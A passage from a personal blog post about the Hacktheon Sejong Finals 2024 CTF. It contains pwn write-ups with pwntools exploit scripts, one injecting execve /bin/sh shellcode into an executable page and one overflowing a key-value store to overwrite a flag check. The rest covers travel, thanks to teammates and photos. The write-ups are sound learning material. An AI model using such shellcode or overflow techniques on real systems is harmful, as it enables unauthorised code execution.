+</span></span><span style="display:flex;"><span>  __ptr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">**</span>)(fds <span style="color:#f92672">+</span> (ulong)param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (__ptr <span style="color:#f92672">==</span> (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>__ptr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fd_mprotect</span>(param_1,<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(__ptr);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(fds <span style="color:#f92672">+</span> (ulong)param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar1;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>reversing the functions is just:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>alloc() allows us to allocate a page  
+</span></span><span style="display:flex;"><span>mprotect() allows to change permissions of the page
+</span></span><span style="display:flex;"><span>insert() allows us to write to the page
+</span></span><span style="display:flex;"><span>execute() allows us to execute instructions in the page
+</span></span></code></pre></div><p>So what we can literally do is just allocate a page, write shellcode to the page, make the page executable, and execute it. Simple as that.</p>
+<p>We just have to send the json data correctly to invoke the calls.</p>
+<blockquote>
+<p>I wasted a lot of time on this challenge because I understood the insert function wrongly, and thought that it takes in a ptr, and copies input from the ptr into the page. But it actually just takes in raw bytes (which is stored in the form of a string), and the bytes are just copied to the page. So yeah I overcomplicated it.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process([&#34;python3&#34;,&#34;simpllocator.py&#34;],aslr=False)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com&#34;</span>,<span style="color:#ae81ff">17935</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>():
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;callNum&#34;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;args&#34;</span>: <span style="color:#66d9ef">None</span>}
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(json<span style="color:#f92672">.</span>dumps(a))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert</span>(idx,payload):
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callNum&#34;</span>: <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;args&#34;</span>: [
+</span></span><span style="display:flex;"><span>                { <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;INT&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: idx },
+</span></span><span style="display:flex;"><span>                { <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;PTR&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: base64<span style="color:#f92672">.</span>b64encode(payload)<span style="color:#f92672">.</span>decode()}
+</span></span><span style="display:flex;"><span>                    ]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(json<span style="color:#f92672">.</span>dumps(a))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mprotect</span>(idx,permission):
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callNum&#34;</span>: <span style="color:#ae81ff">4</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;args&#34;</span>: [
+</span></span><span style="display:flex;"><span>                { <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;INT&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: idx },
+</span></span><span style="display:flex;"><span>                { <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;INT&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: permission}
+</span></span><span style="display:flex;"><span>                    ]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(json<span style="color:#f92672">.</span>dumps(a))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute</span>(idx):
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callNum&#34;</span>: <span style="color:#ae81ff">5</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;args&#34;</span>: [
+</span></span><span style="display:flex;"><span>                { <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;INT&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: idx },
+</span></span><span style="display:flex;"><span>                    ]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(json<span style="color:#f92672">.</span>dumps(a))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alloc()
+</span></span><span style="display:flex;"><span>mprotect(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>insert(<span style="color:#ae81ff">0</span>,sc)
+</span></span><span style="display:flex;"><span>execute(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="dict-pwn">Dict (pwn)<a hidden class="anchor" aria-hidden="true" href="#dict-pwn">#</a></h3>
+<p>The binary is just a simple dictionary / key-value store.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>This is Simple Dictionary
+</span></span><span style="display:flex;"><span>1. Insert
+</span></span><span style="display:flex;"><span>2. Find
+</span></span><span style="display:flex;"><span>3. Exit
+</span></span><span style="display:flex;"><span>&gt; 1
+</span></span><span style="display:flex;"><span>Key &gt; ABAB
+</span></span><span style="display:flex;"><span>Value &gt; CDCD
+</span></span><span style="display:flex;"><span>Insert success
+</span></span></code></pre></div><p>There is a checkflag() function which is called every loop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;This is Simple Dictionary&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">main_loop</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">checkflag</span>();
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">checkflag</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (DAT_00105080 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x31337</span>) {
+</span></span><span style="display:flex;"><span>    __fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;flag&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(__fd,<span style="color:#f92672">&amp;</span>local_58,<span style="color:#ae81ff">0x40</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Flag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>local_58);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So to get the flag, we just have to overwrite <code>DAT_00105080</code> to <code>0x31337</code>.<br>
+I was guessing that the key-values were probably just stored in the global variables memory region, and we could just somehow overwrite <code>DAT_00105080</code> from there.</p>
+<p>To test this, we can just:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>gef➤  search-pattern ABAB
+</span></span><span style="display:flex;"><span>[+] Searching &#39;ABAB&#39; in memory
+</span></span><span style="display:flex;"><span>[+] In &#39;/home/vagrant/ctf/hacktheon_finals24/dict/dict&#39;(0x555555558000-0x555555559000), permission=rw-
+</span></span><span style="display:flex;"><span>  0x555555558081 - 0x55555555808e  →   &#34;ABAB\n=CDCD\n&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gef➤  x/s 0x555555558080
+</span></span><span style="display:flex;"><span>0x555555558080:	&#34;,ABAB\n=CDCD\n&#34;
+</span></span></code></pre></div><p>and the data we&rsquo;re trying to overwrite is at <code>0x0000555555559080</code>.<br>
+So yeah, assuming that there is no limit for the amount of key-values we can make / the limit is large enough, we can just make 0x1000 bytes worth of key-values and then write  <code>0x31337</code>.</p>
+<p>Looking at the function that reads the key-values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FUN_00101375</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Key &gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  sVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>local_b8,<span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Value &gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  sVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>local_98,<span style="color:#ae81ff">0x80</span>);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The max amount of bytes a key can have (counting newline byte) is 0x20, and the max amount of bytes a value can have is 0x80. So we just have to make around <code>0x1000/(0x20+0x80) ~ 25</code> key-values, to overwrite the global variable that is checked for flag.</p>
+<p>It seems that commas and equal signs are added to the key-value strings, also newline bytes are stored too, so we have to include them in our bytes calculation too.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./dict&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com&#34;</span>,<span style="color:#ae81ff">26432</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">25</span>):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Key &gt;&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Value &gt;&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x80</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Key &gt;&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Value &gt;&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Key &gt;&#34;</span>,p32(<span style="color:#ae81ff">0x31337</span>))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Value &gt;&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwn&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>And that&rsquo;s it for the writeups!<br>
+The challenges were pretty alright. I quite liked the interpreter 1 challenge (maybe cause we managed to solve it), but the difficulty for the two pwn challs might be a bit too low. There was another pwn chall that I didn&rsquo;t write about and it had 0 solves, it was a hard C++ pwn chall that required you to exploit reference counting. So the jump of difficulty from the second pwn chall to the third was really huge.</p>
+<p>There was also no crypto challs so our crypto player were just doing forensics lol.<br>
+But overall, the quality of the challs and infra was pretty good. Nice.</p>
+<h2 id="experience">Experience<a hidden class="anchor" aria-hidden="true" href="#experience">#</a></h2>
+<p>One of the best things about this trip is that I got to meet a lot of my friends that I&rsquo;ve made in previous events! It was really fun seeing all of them for a second time (and third time for <a href="https://fazect.github.io/">Faze</a>), and catching up with everyone. I also got to make some new friends through them.</p>
+<p><img loading="lazy" src="/hacktheon_24/bus.JPG" alt=""  />
+
+<em>going to ctf venue with team and SG friends</em></p>
+<p>The hotel provided was really nice, and the organisers even provided us transport from Incheon Airport to Sejong. Everything went pretty smoothly so praise given to the organisers.</p>
+<p>Before we went back to Malaysia, we also toured around myeongdong. We were just walking around the night streets, and we also visited a kpop store. Had quite a lot of fun.</p>
+<p><img loading="lazy" src="/hacktheon_24/myeongdong.JPG" alt=""  />
+</p>
+<p>It was pretty cool since I was just there last year when I went to Korea for codegate, and in <a href="../../posts/codegate_finals23/#conclusion">my blog post about codegate</a>, I wrote that I wished to go to more onsite finals. And now I&rsquo;m here again because of another onsite final. So, pretty cool.</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Thanks so much to my teammates for making this a fun experience, and thanks again to the sponsors for making this trip possible. The organisers did a great job at providing everything, and were really easy to work with. Korea was also pretty nice, the food was pretty good, and everything is very clean.</p>
+<p>Also thanks to all the friends I&rsquo;ve met again there, hope we can meet up again soon!</p>
+<h2 id="photo-dump">Photo dump<a hidden class="anchor" aria-hidden="true" href="#photo-dump">#</a></h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img loading="lazy" src="/hacktheon_24/dump/1.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/2.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/3.JPG" alt=""  />
+</td>
+</tr>
+<tr>
+<td><img loading="lazy" src="/hacktheon_24/dump/4.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/5.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/6.JPG" alt=""  />
+</td>
+</tr>
+<tr>
+<td><img loading="lazy" src="/hacktheon_24/dump/7.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/8.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/9.JPG" alt=""  />
+</td>
+</tr>
+<tr>
+<td><img loading="lazy" src="/hacktheon_24/dump/10.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/11.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/12.JPG" alt=""  />
+</td>
+</tr>
+<tr>
+<td><img loading="lazy" src="/hacktheon_24/dump/13.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/14.JPG" alt=""  />
+</td>
+<td><img loading="lazy" src="/hacktheon_24/dump/15.JPG" alt=""  />
+</td>
+</tr>
+</tbody>
+</table>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://zeynarz.github.io/tags/pwn/">pwn</a></li>
+      <li><a href="https://zeynarz.github.io/tags/writeups/">writeups</a></li>
+      <li><a href="https://zeynarz.github.io/tags/blog/">blog</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://zeynarz.github.io/posts/lakectf_finals23/">
+    <span class="title">Next »</span>
+    <br>
+    <span>LakeCTF Finals 2023</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on twitter"
+        href="https://twitter.com/intent/tweet/?text=Hacktheon%20Sejong%20Finals%202024&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f&amp;hashtags=pwn%2cwriteups%2cblog">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f&amp;title=Hacktheon%20Sejong%20Finals%202024&amp;summary=Hacktheon%20Sejong%20Finals%202024&amp;source=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f&title=Hacktheon%20Sejong%20Finals%202024">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on whatsapp"
+        href="https://api.whatsapp.com/send?text=Hacktheon%20Sejong%20Finals%202024%20-%20https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
